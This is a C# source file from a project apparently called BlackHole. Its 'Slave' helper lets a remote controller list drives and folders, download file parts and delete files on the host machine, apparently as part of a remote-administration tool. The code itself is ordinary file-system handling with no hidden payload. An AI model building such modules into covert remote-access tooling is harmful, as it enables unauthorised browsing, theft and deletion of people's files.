using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Slave.Helper
{
    /// <summary>
    /// 
    /// </summary>
    public static class FileHelper 
    {
        /// <summary>
        /// 
        /// </summary>
        /// <param name="id"></param>
        /// <param name="currentPart"></param>
        /// <param name="path"></param>
        /// <returns></returns>
        public static DownloadedFilePartMessage DownloadFilePart(long id, long currentPart, string path)
            => CommonHelper.DownloadFilePart(id, currentPart, path);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="path"></param>
        /// <returns></returns>
        public static FileDeletionMessage DeleteFile(string path)
        {
            path = Path.GetFullPath(path);

            File.Delete(path);

            return new FileDeletionMessage()
            {
                FilePath = path
            };
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="path"></param>
        /// <returns></returns>
        public static FolderNavigationMessage NavigateToFolder(string path, bool drives)
        {
            if (drives)
            {
                return new FolderNavigationMessage()
                {
                    Path = path,
                    Files = DriveInfo.GetDrives()
                    .Where(drive => drive.IsReady)
                    .Select(drive => new FileMeta()
                    {
                        Type = FileType.FOLDER,
                        Name = drive.Name,
                        Size = drive.DriveType.ToString()
                    }).ToList()
                };
            }
            else
            {
                // transform relative to absolute
                path = Path.GetFullPath(path);

                var files = new List<FileMeta>()
                {
                    new FileMeta()
                    {
                        Type = FileType.FOLDER,
                        Name = "..",
                        Size = "0"
                    }
                };
                // append directories
                files
                    .AddRange(Directory
                                    .GetDirectories(path)
                                    .Select(name => new DirectoryInfo(name))
                                    .Select(info => new FileMeta()
                                    {
                                        Type = FileType.FOLDER,
                                        Name = info.Name + "\\",
                                        Size = "0"
                                    }));
                // append files
                files
                    .AddRange(Directory
                                    .GetFiles(path)
                                    .Select(name => new FileInfo(name))
                                    .Select(info => new FileMeta()
                                    {
                                        Type = FileType.FILE,
                                        Name = info.Name,
                                        Size = Utility.FormatFileSize(info.Length)
                                    }));

                return new FolderNavigationMessage()
                {
                    Path = path,
                    Files = files
                };
            }
        }
    }
}
